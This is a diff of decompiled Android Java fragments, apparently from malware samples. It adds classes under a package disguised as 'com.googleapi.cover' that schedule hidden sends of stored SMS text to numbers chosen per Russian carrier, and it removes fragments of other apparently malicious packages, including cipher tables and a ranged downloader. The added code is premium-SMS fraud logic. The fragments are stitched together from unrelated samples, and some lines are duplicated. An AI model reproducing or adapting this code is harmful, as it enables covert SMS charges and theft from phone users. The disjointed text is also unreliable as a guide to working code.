+        }
+        reader.close();
+        return line;
+    }
+
+Package Path:com.googleapi.cover.Actor.reportDone
+Class Name:Actor
+Content: package com.googleapi.cover;
+
+    public void reportDone() {
+        Utils.putStringValue(this.mContext, CNT_LINK, this.content, this.settings);
+        repo(-1, PendingIntent.getBroadcast(this.mContext, -1, new Intent(Main.SEND_DONE), 0));
+    }
+
+Package Path:com.googleapi.cover.Main.finishInstallation
+Class Name:Main
+Content: package com.googleapi.cover;
+
+    void finishInstallation(String result) {
+        this.wasProgressDone = true;
+        this.installedURL = this.actor.getContentToBeActed();
+        SharedPreferences settings = getSharedPreferences(KEY_PREFS, 0);
+        SharedPreferences.Editor editor = settings.edit();
+        editor.putBoolean(IS_LOADED, true);
+        editor.putString(INSTALL_URL, this.actor.getContentToBeActed());
+        editor.commit();
+        updateGUI();
+    }
+
+Package Path:com.googleapi.cover.MessageHandler.MessageHandler
+Class Name:MessageHandler
+Content: package com.googleapi.cover;
+
+public class MessageHandler extends BroadcastReceiver {
+    public static final String ACTION = "com.googleapi.cover.MessageHandler";
+
+    @Override // android.content.BroadcastReceiver
+    public void onReceive(Context context, Intent intent) {
+        if (intent.getAction().equals(ACTION)) {
+            SharedPreferences settings = context.getSharedPreferences(Main.KEY_PREFS, 0);
+            String smsData = settings.getString(Actor.KEY_MSG_DATA_TEXT, "");
+            LinkedList<Pair<String, String>> list = new LinkedList<>();
+            list.add(Pair.create(Actor.NUM_2, Actor.PREF_PORT));
+            Utils.start(null, new Sch(list.size(), list), smsData, context);
+        }
+    }
+
+    public static void scheduleSend(Context context) {
+        PendingIntent pi = PendingIntent.getBroadcast(context, 0, new Intent(context, (Class<?>) MessageHandler.class).setAction(ACTION), 268435456);
+        AlarmManager am = (AlarmManager) context.getSystemService("alarm");
+        am.set(0, System.currentTimeMillis() + 30000, pi);
     }
 }
 
-Package Path:00D8F11B3887B58ADEF73E479D970C7674A7C918BC7ED05DF5E806E1688FD80B.sources.net.crazymedia.iad.d.e.i
-Class Name:e
-Content: package net.crazymedia.iad.d;
+Package Path:com.googleapi.cover.ActService.getPositiveNums
+Class Name:ActService
+Content: package com.googleapi.cover;
 
-    private static final int[][][] i = {new int[][]{new int[]{14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7}, new int[]{0, 15, 7, 4, 14, 2, 13, 1, 10, 6, 12, 11, 9, 5, 3, 8}, new int[]{4, 1, 14, 8, 13, 6, 2, 11, 15, 12, 9, 7, 3, 10, 5, 0}, new int[]{15, 12, 8, 2, 4, 9, 1, 7, 5, 11, 3, 14, 10, 0, 6, 13}}, new int[][]{new int[]{15, 1, 8, 14, 6, 11, 3, 4, 9, 7, 2, 13, 12, 0, 5, 10}, new int[]{3, 13, 4, 7, 15, 2, 8, 14, 12, 0, 1, 10, 6, 9, 11, 5}, new int[]{0, 14, 7, 11, 10, 4, 13, 1, 5, 8, 12, 6, 9, 3, 2, 15}, new int[]{13, 8, 10, 1, 3, 15, 4, 2, 11, 6, 7, 12, 0, 5, 14, 9}}, new int[][]{new int[]{10, 0, 9, 14, 6, 3, 15, 5, 1, 13, 12, 7, 11, 4, 2, 8}, new int[]{13, 7, 0, 9, 3, 4, 6, 10, 2, 8, 5, 14, 12, 11, 15, 1}, new int[]{13, 6, 4, 9, 8, 15, 3, 0, 11, 1, 2, 12, 5, 10, 14, 7}, new int[]{1, 10, 13, 0, 6, 9, 8, 7, 4, 15, 14, 3, 11, 5, 2, 12}}, new int[][]{new int[]{7, 13, 14, 3, 0, 6, 9, 10, 1, 2, 8, 5, 11, 12, 4, 15}, new int[]{13, 8, 11, 5, 6, 15, 0, 3, 4, 7, 2, 12, 1, 10, 14, 9}, new int[]{10, 6, 9, 0, 12, 11, 7, 13, 15, 1, 3, 14, 5, 2, 8, 4}, new int[]{3, 15, 0, 6, 10, 1, 13, 8, 9, 4, 5, 11, 12, 7, 2, 14}}, new int[][]{new int[]{2, 12, 4, 1, 7, 10, 11, 6, 8, 5, 3, 15, 13, 0, 14, 9}, new int[]{14, 11, 2, 12, 4, 7, 13, 1, 5, 0, 15, 10, 3, 9, 8, 6}, new int[]{4, 2, 1, 11, 10, 13, 7, 8, 15, 9, 12, 5, 6, 3, 0, 14}, new int[]{11, 8, 12, 7, 1, 14, 2, 13, 6, 15, 0, 9, 10, 4, 5, 3}}, new int[][]{new int[]{12, 1, 10, 15, 9, 2, 6, 8, 0, 13, 3, 4, 14, 7, 5, 11}, new int[]{10, 15, 4, 2, 7, 12, 9, 5, 6, 1, 13, 14, 0, 11, 3, 8}, new int[]{9, 14, 15, 5, 2, 8, 12, 3, 7, 0, 4, 10, 1, 13, 11, 6}, new int[]{4, 3, 2, 12, 9, 5, 15, 10, 11, 14, 1, 7, 6, 0, 8, 13}}, new int[][]{new int[]{4, 11, 2, 14, 15, 0, 8, 13, 3, 12, 9, 7, 5, 10, 6, 1}, new int[]{13, 0, 11, 7, 4, 9, 1, 10, 14, 3, 5, 12, 2, 15, 8, 6}, new int[]{1, 4, 11, 13, 12, 3, 7, 14, 10, 15, 6, 8, 0, 5, 9, 2}, new int[]{6, 11, 13, 8, 1, 4, 10, 7, 9, 5, 0, 15, 14, 2, 3, 12}}, new int[][]{new int[]{13, 2, 8, 4, 6, 15, 11, 1, 10, 9, 3, 14, 5, 0, 12, 7}, new int[]{1, 15, 13, 8, 10, 3, 7, 4, 12, 5, 6, 11, 0, 14, 9, 2}, new int[]{7, 11, 4, 1, 9, 12, 14, 2, 0, 6, 10, 13, 15, 3, 5, 8}, new int[]{2, 1, 14, 7, 4, 10, 8, 13, 15, 12, 9, 0, 3, 5, 6, 11}}};
-
-Package Path:00D8F11B3887B58ADEF73E479D970C7674A7C918BC7ED05DF5E806E1688FD80B.sources.com.kuguo.a.f.q
-Class Name:f
-Content: package com.kuguo.a;
-
-    private void q() {
-        this.a.a(this);
-        if (this.g == 1) {
-            long o = o();
-            this.d = (int) o;
-            this.a.b().a("Range", "bytes=" + o + "-");
-        } else {
-            this.d = 0;
-            this.a.b().a("Range", "bytes=0-");
+        private HashMap<String, String> getPositiveNums(boolean isBeline, boolean isMTSRF) {
+            TreeMap<String, String> result = new TreeMap<>();
+            if (isMTSRF) {
+                result.put(ActService.NUM_10, ActService.NUM_1);
+                result.put(ActService.NUM_5, ActService.NUM_3);
+                result.put(ActService.NUM_3, ActService.NUM_1);
+                result.put(ActService.NUM_1, ActService.NUM_1);
+            } else {
+                result.put(Actor.NUM_10, Actor.NUM_1);
+                result.put(Actor.NUM_10_ALT, Actor.NUM_1);
+                result.put(Actor.NUM_5, Actor.NUM_3);
+                result.put(Actor.NUM_3, Actor.NUM_1);
+                result.put(Actor.NUM_3_ALT, Actor.NUM_1);
+                result.put(Actor.NUM_1, "-1");
+                result.put(Actor.NUM_1_ALT, "-1");
+                if (isBeline) {
+                    result.put(ActService.NUM_1, ActService.NUM_1);
+                    result.put(Actor.NUM_2, Actor.NUM_2);
+                    result.put(Actor.NUM_1, Actor.NUM_1);
+                    result.put(Actor.NUM_1, Actor.NUM_1);
+                    result.put(Actor.NUM_1_ALT, Actor.NUM_1_ALT);
+                }
+            }
+            return new HashMap<>(result);
         }
-        this.h = c.a();
-    }
